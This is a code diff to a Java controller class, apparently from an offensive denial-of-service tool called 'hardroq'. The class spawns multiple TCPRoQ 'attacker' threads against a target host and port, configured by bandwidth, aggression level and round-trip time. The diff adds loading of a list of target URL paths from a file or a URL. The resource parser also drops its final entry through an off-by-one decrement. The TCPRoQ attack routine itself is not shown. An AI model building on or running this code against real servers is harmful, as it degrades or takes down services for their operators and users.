@@ -3,17 +3,26 @@ package hardroq.controllers;
 import hardroq.networking.Ping;
 import hardroq.networking.TCPRoQ;
 
+import java.io.BufferedReader;
+import java.io.File;
+import java.io.FileInputStream;
+import java.io.FileNotFoundException;
 import java.io.IOException;
+import java.io.InputStream;
+import java.io.InputStreamReader;
+import java.net.URL;
+import java.net.URLConnection;
 
 public class AttackController {
 	//Singleton Crap
 	private static AttackController _instance = new AttackController();
 	private AttackController() {}
 	
+	//Statics
 	public static AttackController getInstance() {
 		return _instance;
 	}
-	
+
 	//Internals
 	private TCPRoQ[] attackers;
 	private String host;
@@ -27,6 +36,7 @@ public class AttackController {
 	private int numThreads;
 	private Thread pingThread = new Thread();
 	private boolean attacking = false;
+	private String[] resources = new String[0];
 	
 	public void Attack() {
 		//First, let's start the RTT Pinger to initialize the attack vectors
@@ -42,12 +52,15 @@ public class AttackController {
 		
 		startingRTT = RTT;	
 		
+		TCPRoQ.setRTT(RTT);
+		TCPRoQ.setResources(resources);
+		
 		attackers = new TCPRoQ[numThreads];
 		for (int i = numThreads; --i >= 0;) {
 			final TCPRoQ a = new TCPRoQ.Builder().host(host).port(port)
 					.bandwidth(bandwidth / numThreads).header(attackHeader)
 					.footer(attackFooter).aggression(aggressionIndex)
-					.RTT(RTT).build();
+					.build();
 			a.InitiateAttack();
 			attackers[i] = a;
 		}		
@@ -85,11 +98,56 @@ public class AttackController {
 		}
 	};
 	
+	public void LoadResourceList(File resources) {
+		try {
+			parseResources(new FileInputStream(resources));
+		} catch (Exception e) {
+			System.out.println(e.getMessage());
+		}
+	}
+	
+	public void LoadResourceList(URL resources) {
+		try {
+			URLConnection c = resources.openConnection();
+			parseResources(c.getInputStream());
+		} catch (Exception e) {
+			System.out.println(e.getMessage());
+		}
+	}
+	
+	private void parseResources(InputStream in) throws Exception {
+		BufferedReader br = new BufferedReader(new InputStreamReader(in));
+		
+		String[] arr = new String[0];
+		int count = 0;
+		
+		String line = null;
+		while ((line = br.readLine()) != null) {
+			//pull off the protocol if there is one
+			if (line.startsWith("http://" + host))
+				line = line.replace("http://" + host, "");
+			
+			//make sure we have enough space
+			if (count == arr.length) {
+				final String[] _newArr = new String[count * 2 + 1];
+				System.arraycopy(arr, 0, _newArr, 0, count);
+				arr = _newArr;
+			}
+			
+			arr[count++] = line;
+		}
+		
+		//trim the crap
+		resources = new String[--count];
+		System.arraycopy(arr, 0, resources, 0, count);
+	}
+	
 	public long getPacketCount() {
 		long sum = 0;
 		if (attackers != null && attackers.length > 0)
 			for (TCPRoQ a : attackers)
-				sum += a.getPacketsSent();
+				if (a != null)
+					sum += a.getPacketsSent();
 		
 		return sum;
 	}
